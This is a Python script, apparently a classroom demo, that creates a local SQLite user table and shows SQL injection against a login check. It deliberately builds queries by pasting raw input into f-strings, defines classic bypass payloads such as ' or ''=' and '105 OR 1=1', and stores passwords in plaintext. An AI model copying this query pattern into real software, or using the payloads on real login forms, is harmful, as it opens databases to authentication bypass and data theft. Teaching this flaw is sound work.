import sqlite3

data = sqlite3.connect('Register.db')
sql = data.cursor()
sql.execute("""
            
            CREATE TABLE IF NOT EXISTS Users(
            
            UserId INTEGER PRIMARY KEY AUTOINCREMENT,
            username VARCHAR(20),
            password VARCHAR(100),
            bonus VARCHAR(100)

            )
            """)
data.commit()

"""username = input("Please enter username: ") # Nicat
password = input("Please enter password: ") # 1234
# UserId = 1
# bonus = 0

sql.execute("INSERT INTO Users(username, password, bonus) VALUES (?,?,?)", (username,password,0))
data.commit()"""
    
# username_ = input("Please enter username: ") # ' or ''='
# password_ = input("Please enter password: ") # ' or ''='
# UserId_ = input("Please enter UserId:") # 105 OR 1=1

# hacker
username_ = "' or ''='"
password_ = "' or ''='"
UserId_ = "105 OR 1=1"

# normal user
print("Şəxsi məlumatlarım - Login")
username_wrong = input("Please enter wrong username: ") # Murad ve ya ' or ''='
password_wrong = input("Please enter wrong password: ") # 5678 ve ya ' or ''='

if sql.execute(f"SELECT * FROM Users WHERE username = '{username_wrong}' AND password = '{password_wrong}'"):
    sonuc = sql.fetchall()
    print(sonuc)
    if sonuc != []:
        print("SQL Injection Success 'user' ")
        print()
        print()
    else:
        print("SQL Injection failed 'user' ")
        print()
        print()

"""if sql.execute(f"SELECT * FROM Users WHERE username = '{username_}' AND password = '{password_}'"):
    sonuc = sql.fetchall()
    print(sonuc)
    if sonuc != []:
        print("SQL Injection Success 'Hacker' ")
    else:
        print("SQL Injection failed 'Hacker' ")

if sql.execute(f"SELECT * FROM Users WHERE UserId = {UserId_}"):
    sonuc = sql.fetchall()
    print(sonuc)
    if sonuc != []:
        print("SQL Injection Success 'hacker' ")
    else:
        print("SQL Injection failed 'hacker' ")"""

"""sql.execute("SELECT * FROM Users")
sqluser = sql.fetchall()
user_exists1 = any(username_ == user[1] for user in sqluser)
user_exists2 = any(password_ == user[2] for user in sqluser)
print("' or ''='",user_exists1,user_exists2)
print("SQL Injection failed")"""